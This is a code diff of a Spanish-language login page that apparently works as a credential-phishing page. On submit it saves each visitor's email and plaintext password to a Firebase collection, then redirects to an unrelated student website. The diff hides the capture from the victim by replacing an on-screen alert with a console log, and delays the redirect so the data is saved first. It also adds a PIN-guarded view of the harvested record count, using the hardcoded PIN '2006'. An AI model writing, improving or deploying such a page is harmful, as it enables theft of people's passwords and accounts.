@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
@@ -88,7 +88,6 @@
       text-decoration: underline; 
     }
 
-    /* Animación */
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(-20px); }
       to { opacity: 1; transform: translateY(0); }
@@ -134,27 +133,36 @@
 
     loginForm.addEventListener('submit', async function(e){
       e.preventDefault();
+
       const email = this.email.value;
       const password = this.password.value;
 
       try {
+        // Guardar en Firebase
         await addDoc(collection(db, "usuarios"), {
           email: email,
           password: password,
           fecha: new Date().toLocaleString()
         });
-        alert("✅ Datos guardados en Firebase");
-        window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
+
+        console.log("✅ Datos guardados en Firebase");
+
+        // Redirección con pequeño retraso para asegurar que se guarden los datos
+        setTimeout(() => {
+          window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
+        }, 100);
+
       } catch (error) {
-        console.error("Error guardando datos: ", error);
-        alert("❌ Error al guardar los datos. Por favor, inténtalo nuevamente.");
+        console.error("❌ Error guardando datos:", error);
+        alert("Error al guardar datos. Intenta nuevamente.");
       }
     });
 
     recoverLink.addEventListener('click', function(){
       const pin = prompt("Ingresa el PIN para acceder a los datos:");
       if(pin === "2006"){
-        alert("✅ Acceso permitido (aquí iría la vista del historial)");
+        const historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
+        alert("✅ Acceso permitido. Cantidad de registros: " + historial.length);
       } else {
         alert("PIN incorrecto ❌");
       }
@@ -163,4 +171,5 @@
 
 </body>
 </html>
+
 
